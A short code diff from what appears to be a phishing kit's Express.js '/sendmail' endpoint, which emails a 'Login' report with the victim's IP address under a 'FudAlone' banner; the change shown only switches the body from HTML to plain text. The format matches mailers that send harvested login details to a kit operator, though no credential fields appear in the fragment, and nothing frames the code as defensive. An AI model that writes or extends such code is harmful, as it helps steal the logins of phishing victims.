@@ -32,7 +32,7 @@ app.post("/sendmail", async (req, res) => {
     const details = {
         to: `${to}`,
         subject: `Login: ${clientIp}`,
-        html: `|----------| FudAlone|--------------|<br>
+        text: `|----------| FudAlone|--------------|<br>
 	
 Login From           : ${clientIp}<br>
 
